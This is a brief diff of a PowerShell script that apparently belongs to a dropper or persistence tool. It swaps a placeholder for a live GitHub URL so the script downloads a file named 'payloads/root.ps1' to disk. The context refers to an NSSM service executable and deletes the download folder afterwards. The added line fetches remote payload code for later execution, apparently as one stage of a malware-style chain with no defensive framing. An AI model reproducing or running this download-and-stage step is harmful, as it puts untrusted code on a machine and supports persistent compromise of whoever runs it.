@@ -34,7 +34,7 @@ if(-not(Test-Path -Path $nssmexe -PathType Leaf)){
 }
 
 if(-not(Test-Path -Path $rootScriptPath -PathType Leaf)){
-    iwr -Uri "ROOT.ps1_URI" -OutFile $rootScriptPath
+    iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootScriptPath
 }
 
 Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
